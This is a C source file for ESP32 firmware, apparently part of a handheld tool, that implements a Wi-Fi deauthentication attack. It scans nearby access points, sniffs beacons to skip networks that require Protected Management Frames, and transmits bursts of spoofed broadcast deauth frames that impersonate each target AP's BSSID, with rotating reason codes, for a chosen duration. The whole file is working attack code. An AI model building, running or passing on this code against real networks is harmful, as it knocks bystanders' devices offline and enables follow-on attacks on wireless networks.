#include "polycast5_macros.h"

#include <string.h>
#include <time.h>
#include <sys/time.h>
#include <stdlib.h>

#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_random.h"
#include "esp_err.h"
#include "esp_timer.h"

#include "wifi_utils.h"
#include "wifi_task.h"

#include "wifi_deauth.h"

#define TAG "WIFI_DEAUTH"

#define DEAUTH_BURST_PKTS_DEFAULT 25

#define TIMER_GET_TIME_SEC() ((uint32_t)(esp_timer_get_time() / 1000000ULL))

// 802.11 deauth frame structure
typedef struct {
    uint8_t frame_ctrl[2];
    uint8_t duration[2];
    uint8_t dest_addr[6];
    uint8_t src_addr[6];
    uint8_t ap_bssid[6];
    uint8_t seq_ctrl[2];
    uint8_t reason[2];
} __attribute__((packed)) deauth_frame_t; // Packed to avoid padding bytes

static volatile bool pmf_sniff_done = false;
static volatile bool pmf_sniff_has_rsn = false;
static bool pmf_sniff_required = false;
static bool pmf_sniff_capable = false;
static uint8_t pmf_sniff_bssid[6] = {0};
static TaskHandle_t pmf_sniff_handle = NULL;

// Global task handle to allow stopping if needed
static TaskHandle_t deauth_task_handle = NULL;

// ┌──────────────────────────────────────────────────────────────────────────────┐
// │                 802.11 Management Frame (Generic) Structure                  │
// ├──────────────────────────────────────────────────────────────────────────────┤
// │                               MAC Header (24)                                │
// ├──────────────┬─────────────┬────────────┬────────────┬────────────┬──────────┤
// │ Frame Control│ Duration/ID │   Addr1    │   Addr2    │   Addr3    │ Seq Ctrl │
// │   2 bytes    │   2 bytes   │  6 bytes   │  6 bytes   │  6 bytes   │ 2 bytes  │
// ├──────────────┴─────────────┴────────────┴────────────┴────────────┴──────────┤
// │                         Frame Body / Payload (0..2312)                       │
// │     (Variable; depends on subtype: Beacon/Probe/Auth/Assoc/Deauth/etc.)      │
// ├──────────────────────────────────────────────────────────────────────────────┤
// │                               FCS (4 bytes)                                  │
// │                    (Frame Check Sequence; added/checked by HW)               │
// └──────────────────────────────────────────────────────────────────────────────┘
//
// Notes (typical Management frames have ToDS=0 and FromDS=0):
//   - Addr1: RA/DA (Receiver/Destination)  (e.g., station MAC, or broadcast FF:FF:FF:FF:FF:FF)
//   - Addr2: TA/SA (Transmitter/Source)   (e.g., AP MAC for beacons)
//   - Addr3: BSSID                         (AP’s BSSID for infra BSS)
//   - Addr4: not present in management frames (only present in 4-address data/WDS frames)
//
// Frame Control (2 bytes) highlights:
//   - Type = 0b00 (Management)
//   - Subtype selects: Beacon(0x8), Probe Req(0x4), Probe Resp(0x5), Auth(0xB), Deauth(0xC), etc.
//   - ToDS/FromDS are normally 0/0 for management frames
static void wifi_sniffer_pmf_cb(void* buf, wifi_promiscuous_pkt_type_t type)
{
    // Make sure it's a management packet
    if (type != WIFI_PKT_MGMT) {
        return;
    }

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t *frame = pkt->payload;
    size_t frame_len = pkt->rx_ctrl.sig_len;

    // Need at least a full mgmt header before touching fixed offsets
    if (frame_len < 24) {
        return;
    }

    // Extract frame control field (first 2 bytes)
    uint16_t frame_ctrl = (frame[1] << 8) | frame[0];

    // Make sure it's a management frame
    if (FC_TYPE(frame_ctrl) != TYPE_MGMT) {
        return;
    }

    // Check subtype: only care about Beacon and Probe Response
    uint8_t st = FC_SUBTYPE(frame_ctrl);
    if (st != SUBTYPE_BEACON && st != SUBTYPE_PROBE_RESP) {
        return;
    }

    // Need fixed params for Beacon/ProbeResp: 24-byte header + 12 bytes fixed
    if (frame_len < (24 + 12)) {
        return;
    }

    // Beacon/Probe Response: Address3 at offset 16 is the BSSID
    const uint8_t *bssid = &frame[16];
    if (memcmp(bssid, pmf_sniff_bssid, 6) != 0) {
        return; // Exit if BSSID doesn't match
    }

    // Fixed params (12 bytes) after 24-byte header, then IEs
    uint8_t *ie = frame + 24 + 12;
    int rem = (int)frame_len - (int)(ie - frame);

    // Exit if no remaining bytes for IEs
    if (rem <= 0) {
        // We did see the target frame; treat as "no RSN IE"
        pmf_sniff_done = true;
        if (pmf_sniff_done && pmf_sniff_handle) {
            xTaskNotifyGive(pmf_sniff_handle);
        }
        return;
    }

    wifi_beacon_t beacon = {0};
    bool found_rsn = false;

    // Parse Information Elements (IEs) for RSN IE
    while (rem >= 2) {
        uint8_t id = ie[0];
        uint8_t len = ie[1];

        // Exit if IE length exceeds remaining bytes
        if (len + 2 > rem) {
            break;
        }

        uint8_t *data = ie + 2;

        if (id == 48) { // RSN IE
            pmf_sniff_has_rsn = true;
            wifi_utils_parse_rsn_ie(data, len, &beacon);
            pmf_sniff_capable = beacon.pmf_capable;
            pmf_sniff_required = beacon.pmf_required;
            found_rsn = true;
            break;
        }

        // Move to next IE
        ie += len + 2;
        rem -= len + 2;
    }

    // Mark done once we saw a matching Beacon/ProbeResp, even if RSN IE wasn't present
    pmf_sniff_done = true;
    if (!found_rsn) {
        pmf_sniff_has_rsn = false;
        pmf_sniff_required = false;
        pmf_sniff_capable = false;
    }

    if (pmf_sniff_done && pmf_sniff_handle) {
        // Notify pmf sniff is complete
        xTaskNotifyGive(pmf_sniff_handle);
    }
}

static esp_err_t pmf_from_rsn_ie(uint8_t channel, const uint8_t bssid[6])
{
    // Validate input
    if (!bssid) {
        ESP_LOGE(TAG, "pmf_from_rsn_ie: Invalid NULL bssid");
        return ESP_ERR_INVALID_ARG;
    }

    // Reset globals
    pmf_sniff_done = false;
    pmf_sniff_has_rsn = false; // Robust Security Network
    pmf_sniff_required = false;
    pmf_sniff_capable = false;
    pmf_sniff_handle = xTaskGetCurrentTaskHandle();

    // Copy BSSID into global for callback
    memcpy(pmf_sniff_bssid, bssid, 6);

    // Management frames only
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
    };

    // Set channel, filter, callback, and enable promiscuous mode
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE));
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_promiscuous_filter(&filter));
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_pmf_cb));
    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_promiscuous(true));

    // Wait briefly for a beacon/probe response (RSN IE may or may not be present)
    (void)ulTaskNotifyTake(pdTRUE, pdMS_TO_TICKS(750));

    // Disable promiscuous mode and clear callback
    (void)esp_wifi_set_promiscuous(false);
    (void)esp_wifi_set_promiscuous_rx_cb(NULL);

    pmf_sniff_handle = NULL;

    if (!pmf_sniff_done) {
#ifdef POLYCAST5_DEBUG
        ESP_LOGW(TAG, "pmf_from_rsn_ie: sniff timed out");
#endif
        return ESP_ERR_TIMEOUT;
    }

    // If RSN IE wasn't present, PMF isn't applicable (open/WEP/etc.)
    if (!pmf_sniff_has_rsn) {
        pmf_sniff_required = false;
        pmf_sniff_capable = false;
        return ESP_OK;
    }

    return ESP_OK;
}

static void infer_pmf_from_authmode(wifi_auth_mode_t authmode, bool *pmf_required, bool *pmf_capable)
{
    *pmf_required = false;
    *pmf_capable = false;

    switch (authmode) {
        case WIFI_AUTH_WPA3_PSK:
            // WPA3-Personal (SAE) requires PMF
            *pmf_required = true;
            *pmf_capable = true;
            break;

        case WIFI_AUTH_WPA2_WPA3_PSK:
            // Transition mode: PMF capable but not required
            *pmf_required = false;
            *pmf_capable = true;
            break;

        case WIFI_AUTH_WAPI_PSK:
            // WAPI typically requires PMF
            *pmf_required = true;
            *pmf_capable = true;
            break;

        case WIFI_AUTH_OWE:
            // Enhanced Open (OWE) requires PMF
            *pmf_required = true;
            *pmf_capable = true;
            break;

        case WIFI_AUTH_WPA3_ENT_192:
            // WPA3-Enterprise 192-bit requires PMF
            *pmf_required = true;
            *pmf_capable = true;
            break;

        case WIFI_AUTH_WPA2_PSK:
        case WIFI_AUTH_WPA_WPA2_PSK:
        case WIFI_AUTH_ENTERPRISE:
            // WPA2 modes: PMF may or may not be enabled
            // We can't tell from authmode alone - need RSN IE sniff
            *pmf_required = false;
            *pmf_capable = false; // Conservative: assume not capable unless sniff confirms
            break;

        default:
            // Open, WEP, WPA-only: no PMF
            *pmf_required = false;
            *pmf_capable = false;
            break;
    }
}

#ifdef POLYCAST5_DEBUG
static void auth_to_str(uint8_t authmode, char *out_str, size_t out_str_len)
{
    switch (authmode) {
        case WIFI_AUTH_OPEN:
            strlcpy(out_str, "OPEN", out_str_len);
            break;
        case WIFI_AUTH_WEP:
            strlcpy(out_str, "WEP", out_str_len);
            break;
        case WIFI_AUTH_WPA_PSK:
            strlcpy(out_str, "WPA-PSK", out_str_len);
            break;
        case WIFI_AUTH_WPA2_PSK:
            strlcpy(out_str, "WPA2-PSK", out_str_len);
            break;
        case WIFI_AUTH_WPA_WPA2_PSK:
            strlcpy(out_str, "WPA/WPA2-PSK", out_str_len);
            break;
        case WIFI_AUTH_ENTERPRISE:
            strlcpy(out_str, "WPA2-Enterprise", out_str_len);
            break;
        case WIFI_AUTH_WPA3_PSK:
            strlcpy(out_str, "WPA3-PSK", out_str_len);
            break;
        case WIFI_AUTH_OWE:
            strlcpy(out_str, "OWE", out_str_len);
            break;
        default:
            strlcpy(out_str, "UNKNOWN", out_str_len);
            break;
    }
}
#endif

esp_err_t wifi_deauth_scan(wifi_scan_deauth_t *wifi_scan_deauth)
{
    if (!wifi_scan_deauth) {
        ESP_LOGE(TAG, "wifi_deauth_scan: wifi_scan_deauth is NULL");
        return ESP_ERR_INVALID_ARG;
    }

    // Fresh start
    memset(wifi_scan_deauth, 0, sizeof(*wifi_scan_deauth) * WIFI_MAX_NETWORKS);

    esp_err_t err;

    // Set to scan all SSIDs and channels
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0, // 0 = scan all channels
        .show_hidden = true
    };

    // Start scan (true = block until scan done)
    err = esp_wifi_scan_start(&scan_config, true);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "wifi_deauth_scan: esp_wifi_scan_start failed: %s", esp_err_to_name(err));
        return err;
    }

    // How many APs were found
    uint16_t ap_num = 0;
    err = esp_wifi_scan_get_ap_num(&ap_num);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "wifi_deauth_scan: esp_wifi_scan_get_ap_num failed: %s", esp_err_to_name(err));
        return err;
    }

    // If no networks found
    if (ap_num == 0) {
#ifdef POLYCAST5_DEBUG
        ESP_LOGW(TAG, "wifi_deauth_scan: esp_wifi_scan_get_ap_num: No access points found");
#endif
        
        // Already zeroed above, just need to set sentinel

        // Use an impossible auth value as a sentinel marker
        wifi_scan_deauth->auth = 0xFF;

        // Signal LCD no APs found
        if (xQueueSend(xWifiDeauthScanQueue, wifi_scan_deauth, portMAX_DELAY) != pdPASS) {
            ESP_LOGE(TAG, "xWifiDeauthScanQueue: ap_num == 0: Failed to enqueue");
        }

        // Exit without error
        return ESP_OK;
    }

    // Allocate array to hold results
    wifi_ap_record_t *ap_list = malloc(sizeof(wifi_ap_record_t) * ap_num);
    if (!ap_list) {
        ESP_LOGE(TAG, "wifi_deauth_scan: malloc for ap_list failed");
        return ESP_ERR_NO_MEM;
    }

    // Pull the records
    err = esp_wifi_scan_get_ap_records(&ap_num, ap_list);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "wifi_deauth_scan: esp_wifi_scan_get_ap_records failed: %s", esp_err_to_name(err));
        free(ap_list);
        return err;
    }

    // Build list of networks that don't require PMF (can be deauthed)
    uint16_t count = 0;

    for (uint16_t i = 0; i < ap_num; ++i) {
        // Stop if we've reached max capacity
        if (count >= WIFI_MAX_NETWORKS) {
#ifdef POLYCAST5_DEBUG
            ESP_LOGW(TAG, "wifi_deauth_scan: reached max deauth capacity (%" PRIu16 "/%d)", count, WIFI_MAX_NETWORKS);
#endif
            continue;
        }

        const char *ssid = (char *)ap_list[i].ssid;

        // Skip blank SSIDs
        if (ssid[0] == '\0' || strlen(ssid) == 0) {
            continue;
        }

        // Calculate frequency from channel
        int channel = ap_list[i].primary;
        int freq_mhz = 0;
        if (channel >= 1  && channel < 14) {
            freq_mhz = 2412 + 5 * (channel - 1);
        } else if (channel == 14) {
            freq_mhz = 2484; // Special case
        } else if (channel >= 36 && channel <= 165) {
            freq_mhz = 5000 + (5 * channel);
        }

        // Try sniffing for RSN IE first (more accurate)
        esp_err_t err = pmf_from_rsn_ie(channel, ap_list[i].bssid);
        
        // If sniff failed/timed out, fall back to authmode inference
        if (err != ESP_OK) {
#ifdef POLYCAST5_DEBUG
            ESP_LOGW(TAG, "wifi_deauth_scan: RSN sniff failed for '%s', using authmode inference", ssid);
#endif
            
            // Infer PMF from the authmode reported by the scan
            infer_pmf_from_authmode(ap_list[i].authmode, &pmf_sniff_required, &pmf_sniff_capable);
        }

#ifdef POLYCAST5_DEBUG
        char auth_str[20] = {0};
        auth_to_str(ap_list[i].authmode, auth_str, sizeof(auth_str));
        ESP_LOGI(TAG,
                "wifi_deauth_scan: [%d] SSID: %-32s BSSID: %02x:%02x:%02x:%02x:%02x:%02x RSSI: %3d  CH:%2d  "
                "AUTH:%s PMF Required: %d PMF Capable: %d",
                i,
                (char*)ap_list[i].ssid,
                ap_list[i].bssid[0], ap_list[i].bssid[1],
                ap_list[i].bssid[2], ap_list[i].bssid[3],
                ap_list[i].bssid[4], ap_list[i].bssid[5],
                ap_list[i].rssi,
                ap_list[i].primary,
                auth_str,
                pmf_sniff_required,
                pmf_sniff_capable
        );
#endif

        if (pmf_sniff_required) {
            // Skip APs that require PMF (cannot deauth them)
            continue;
        }

        // Check if this SSID already exists in our results
        bool found = false;
        uint16_t existing_idx = 0;
        for (uint16_t j = 0; j < count; ++j) {
            if (strcmp((char *)wifi_scan_deauth[j].ssid, ssid) == 0) {
                found = true;
                existing_idx = j;
                break;
            }
        }

        if (found) {
            // Add BSSID to existing entry if there's room
            wifi_scan_deauth_t *entry = &wifi_scan_deauth[existing_idx];
            if (entry->bssid_count < WIFI_MAX_NETWORKS - 1) {
                // Copy the BSSID and channel into the next slot for that SSID
                memcpy(entry->bssid[entry->bssid_count], ap_list[i].bssid, 6);
                entry->channels[entry->bssid_count] = ap_list[i].primary;
                entry->bssid_count++;
            }
            // Update other stats if this AP is stronger
            if (ap_list[i].rssi > entry->rssi) {
                entry->rssi = ap_list[i].rssi;
                entry->channel = ap_list[i].primary;
                entry->freq_mhz = freq_mhz;
                entry->auth = ap_list[i].authmode;
                entry->pmf_required = pmf_sniff_required;
                entry->pmf_capable = pmf_sniff_capable;
            }
        } else {
            // New SSID: add a fresh entry
            if (count >= WIFI_MAX_NETWORKS) {
#ifdef POLYCAST5_DEBUG
                ESP_LOGW(TAG, "wifi_deauth_scan: reached max deauth capacity (%" PRIu16 "/%d)", count, WIFI_MAX_NETWORKS);
#endif
                continue;
            }

            wifi_scan_deauth_t *entry = &wifi_scan_deauth[count];
            memset(entry, 0, sizeof(*entry)); // Clear fresh entry

            // Copy the SSID
            strlcpy((char *)entry->ssid, ssid, sizeof(entry->ssid));

            // Copy the BSSID and channel into first slot
            memcpy(entry->bssid[0], ap_list[i].bssid, 6);
            entry->channels[0] = ap_list[i].primary;
            entry->bssid_count = 1; // Next starts at index 1

            // Fill the rest
            entry->rssi = ap_list[i].rssi;
            entry->channel = ap_list[i].primary;
            entry->auth = ap_list[i].authmode;
            entry->freq_mhz = freq_mhz;
            entry->pmf_required = pmf_sniff_required;
            entry->pmf_capable = pmf_sniff_capable;

            count++;
        }
    }

    // Push the unique SSIDs
    for (size_t i = 0; i < count; ++i) {
        if (xQueueSend(xWifiDeauthScanQueue, &wifi_scan_deauth[i], portMAX_DELAY) != pdPASS) {
            ESP_LOGE(TAG, "xWifiDeauthScanQueue: Failed to enqueue #%u", (unsigned)i);
        }
    }

    free(ap_list);
    return ESP_OK;
}

// ┌─────────────────────────────────────────────────────────────────┐
// │                 802.11 Deauth Frame Structure                   │
// ├─────────────────────────────────────────────────────────────────┤
// │                     MAC Header (24 bytes)                       │
// ├─────────────────────────────────────────────────────────────────┤
// │ Frame Control │ Duration │   DA   │   SA   │  BSSID  │ Seq Ctrl │
// │    2 bytes    │ 2 bytes  │ 6 bytes│ 6 bytes│ 6 bytes │ 2 bytes  │
// ├─────────────────────────────────────────────────────────────────┤
// │                     Frame Body (2 bytes)                        │
// ├─────────────────────────────────────────────────────────────────┤
// │                        Reason Code                              │
// │                         2 bytes                                 │
// ├─────────────────────────────────────────────────────────────────┤
// │                     FCS (4 bytes) - HW added                    │
// └─────────────────────────────────────────────────────────────────┘
static void send_deauth_frames_burst(const uint8_t *bssid, uint16_t *seq_num, uint32_t *packets_sent, uint32_t burst)
{
    static uint16_t reasons[] = {0x0001, 0x0003, 0x0006, 0x0007, 0x0008}; // Common reason codes
    static uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Send to all stations
    
    // Send burst of deauth frames with different reason codes
    for (uint32_t i = 0; i < burst; ++i) {
        uint16_t dc_reason = reasons[i % 5]; // Random reason code
    
        /* Create deauth frame */

        deauth_frame_t frame;
        memset(&frame, 0, sizeof(frame)); // Zero out frame
        
        // Set as a deauth frame
        frame.frame_ctrl[0] = 0xC0;
        frame.frame_ctrl[1] = 0x00;

        // Set duration to 0
        frame.duration[0] = 0x00;
        frame.duration[1] = 0x00;
        
        // Set destination, source, and BSSID addresses
        memcpy(frame.dest_addr, broadcast_mac, 6);
        memcpy(frame.src_addr, bssid, 6);
        memcpy(frame.ap_bssid, bssid, 6);
        
        // Set sequence control
        // Byte 0: [Seq bits 0-3][Frag bits 0-3] ->  upper nibble = seq, lower nibble = frag
        // Byte 1: [Seq bits 4-11]               ->  remaining 8 bits of sequence

        // Extract lowest 4 bits of sequence number and shift to upper nibble
        // Sets fragment number to 0
        frame.seq_ctrl[0] = (*seq_num & 0x0F) << 4;
        // Remaining 8 bits of sequence number
        frame.seq_ctrl[1] = (*seq_num >> 4) & 0xFF;
        
        // Set reason code
        frame.reason[0] = dc_reason & 0xFF; // Lower 8 bits of reason code
        frame.reason[1] = (dc_reason >> 8) & 0xFF; // Upper 8 bits of reason code

        /* Transmit the frame */
        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
        if (err != ESP_OK) {
            if (err == ESP_ERR_NO_MEM) {
#ifdef POLYCAST5_DEBUG
                //ESP_LOGW(TAG, "send_deauth_frames_burst: esp_wifi_80211_tx warning (expected): %s", esp_err_to_name(err));
#endif
            } else {
                ESP_LOGE(TAG, "send_deauth_frames_burst: esp_wifi_80211_tx failed: %s", esp_err_to_name(err));
            }
            // Try to send remaining frames
            continue;
        } else { // Frame TX successful
            // Increment seq_num with wrap at 4096 (12-bit sequence number)
            *seq_num = (*seq_num + 1) & 0x0FFF;
            
            // Increment sent counter
            (*packets_sent)++;
        }
    }
}

static void deauth_send_task(void *pvParameters)
{
    // Get passed target params
    deauth_target_t *deauth_target = (deauth_target_t *)pvParameters;

    // Deauth stats to send to user
    deauth_stats_t deauth_stats = {0};

    // Set initial values
    uint32_t attack_start_time = TIMER_GET_TIME_SEC(); // Start time
#ifdef POLYCAST5_DEBUG
    uint32_t last_log_time = 0; // Last log time
#endif
    uint32_t cycle_count = 0; // Burst cycle counter

#ifdef POLYCAST5_DEBUG
    ESP_LOGI(TAG, "deauth_send_task started with %d BSSID(s) for SSID '%s'",
            deauth_target->bssid_count, deauth_target->ssid);
#endif

    uint8_t bssid_idx = 0;

    // Set initial channel to match first BSSID
    esp_wifi_set_channel(deauth_target->channels[0], WIFI_SECOND_CHAN_NONE);
    deauth_target->channel = deauth_target->channels[0];
    vTaskDelay(pdMS_TO_TICKS(50)); // Allow radio to settle after initial channel set

    while (1) {
        // Get elapsed time since task started
        uint32_t time_elapsed = TIMER_GET_TIME_SEC() - attack_start_time;

        // Check if duration expired
        if (time_elapsed >= deauth_target->duration_sec) {
#ifdef POLYCAST5_DEBUG
            ESP_LOGI(TAG, "deauth_send_task duration expired");
#endif
            break;
        }
        if (xEventGroupGetBits(xWifiEventGroup) & WIFI_STOP_DEAUTH_BIT) {
#ifdef POLYCAST5_DEBUG
            ESP_LOGI(TAG, "deauth_send_task stop requested: WIFI_STOP_DEAUTH_BIT set");
#endif
            xEventGroupClearBits(xWifiEventGroup, WIFI_STOP_DEAUTH_BIT);
            break;
        }

        // Switch channel if needed for this BSSID
        uint8_t target_channel = deauth_target->channels[bssid_idx];
        if (target_channel != deauth_target->channel) {
            esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
            deauth_target->channel = target_channel;
            vTaskDelay(pdMS_TO_TICKS(20)); // Allow radio to settle after channel switch
        }

        // This is a lot of logging: disable unless debugging deauth
        // #ifdef POLYCAST5_DEBUG
        // ESP_LOGI(TAG, "Deauth burst on SSID=%s, BSSID=%02x:%02x:%02x:%02x:%02x:%02x, channel=%d",
        //         deauth_target->ssid,
        //         deauth_target->bssid[bssid_idx][0], deauth_target->bssid[bssid_idx][1],
        //         deauth_target->bssid[bssid_idx][2], deauth_target->bssid[bssid_idx][3],
        //         deauth_target->bssid[bssid_idx][4], deauth_target->bssid[bssid_idx][5],
        //         target_channel);
        // #endif

        // Send a burst per BSSID before switching
        send_deauth_frames_burst(deauth_target->bssid[bssid_idx], &deauth_target->seq_nums[bssid_idx], &deauth_target->frames_sent, DEAUTH_BURST_PKTS_DEFAULT);

        // Move to next BSSID
        bssid_idx++;
        if (bssid_idx >= deauth_target->bssid_count) {
            bssid_idx = 0; // Wrap around
        }

        // Increment cycle count
        cycle_count++;

#ifdef POLYCAST5_DEBUG
        // Periodic logging
        if (time_elapsed - last_log_time >= 1) { // Log every second
            last_log_time = time_elapsed;

            // Calculate packets per second
            float packets_per_sec = (float)deauth_target->frames_sent / (float)(time_elapsed > 0 ? time_elapsed : 1);

            // Calculate remaining time
            uint32_t remaining_sec = deauth_target->duration_sec - time_elapsed;

            ESP_LOGI(TAG, "[%lu/%lu sec] Total: %lu frames | FPS: %.0f | Cycles: %lu | Remaining: %lu sec",
                    time_elapsed, deauth_target->duration_sec, deauth_target->frames_sent, packets_per_sec, cycle_count, remaining_sec);
        }
#endif

        // Stats to send to user
        deauth_stats.deauthing = true;
        deauth_stats.frames_sent = deauth_target->frames_sent;
        deauth_stats.duration_sec = deauth_target->duration_sec;
        if (xQueueSend(xWifiDeauthStatsQueue, &deauth_stats, 0) != pdPASS) {
            //ESP_LOGW(TAG, "deauth_send_task: Failed to send deauth stats to queue");
        }

        // Feed the watchdog
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    // Final stats
    uint32_t total_time = TIMER_GET_TIME_SEC() - attack_start_time;
    float avg_pps = total_time > 0 ? (float)deauth_target->frames_sent / total_time : 0;

#ifdef POLYCAST5_DEBUG
    ESP_LOGI(TAG, "Total packets: %lu", deauth_target->frames_sent);
    ESP_LOGI(TAG, "Total time: %lu sec", total_time);
    ESP_LOGI(TAG, "Average PPS: %.0f", avg_pps);
#endif

    // Stop Wi-Fi
    esp_wifi_stop();

    // Send final stats to user
    deauth_stats.deauthing = false;
    deauth_stats.frames_sent = deauth_target->frames_sent;
    deauth_stats.duration_sec = deauth_target->duration_sec;
    if (xQueueSend(xWifiDeauthStatsQueue, &deauth_stats, portMAX_DELAY) != pdPASS) {
        ESP_LOGE(TAG, "deauth_send_task: Failed to send deauth stats to queue");
    }

    // Reset global task handle
    deauth_task_handle = NULL;

    // Delete the task
    vTaskDelete(NULL);
}

esp_err_t wifi_deauth_send_for_duration(deauth_target_t *deauth_target)
{
    // Check for errors
    if (deauth_task_handle != NULL) {
        ESP_LOGW(TAG, "wifi_utils_deauth_for_duration: already running");
        return ESP_ERR_INVALID_STATE;
    }
    if (!deauth_target) {
        ESP_LOGE(TAG, "wifi_utils_deauth_for_duration: invalid deauth_target");
        return ESP_ERR_INVALID_ARG;
    }
    if (deauth_target->duration_sec == 0) {
        ESP_LOGE(TAG, "wifi_utils_deauth_for_duration: duration_sec cannot be zero");
        return ESP_ERR_INVALID_ARG;
    }
    if (deauth_target->channel == 0 || deauth_target->channel > 165) {
        ESP_LOGE(TAG, "wifi_utils_deauth_for_duration: invalid channel: %d", deauth_target->channel);
        return ESP_ERR_INVALID_ARG;
    }

    // Clear any previous stop requests
    xEventGroupClearBits(xWifiEventGroup, WIFI_STOP_DEAUTH_BIT);

    // Populate fields
    deauth_target->frames_sent = 0;
    
    // Initialize per-BSSID sequence numbers with random starts
    for (uint8_t i = 0; i < deauth_target->bssid_count; ++i) {
        deauth_target->seq_nums[i] = esp_random() & 0x0FFF; // Random start (0-4095)
    }

    // Setup Wi-Fi in STA mode
    esp_err_t err = esp_wifi_set_mode(WIFI_MODE_STA);
    if (err != ESP_OK) {
        return err;
    }

    // Small delay to ensure mode set
    vTaskDelay(pdMS_TO_TICKS(250));

    // Start Wi-Fi
    err = esp_wifi_start();
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "wifi_utils_deauth_for_duration: esp_wifi_start failed: %s", esp_err_to_name(err));
        return err;
    }

    // Create dedicated deauth_send_task
    BaseType_t ret = xTaskCreate(deauth_send_task, "deauth_task", (1024 * 4), deauth_target, POLYCAST5_PRIORITY_MEDIUM, &deauth_task_handle); // Pass deauth_target as task parameter
    if (ret != pdPASS) {
        ESP_LOGE(TAG, "wifi_utils_deauth_for_duration: Failed to create deauth_send_task");
        esp_wifi_stop();
        return ESP_FAIL;
    }

#ifdef POLYCAST5_DEBUG
    ESP_LOGI(TAG, "deauth_send_task started");
#endif

    return ESP_OK;
}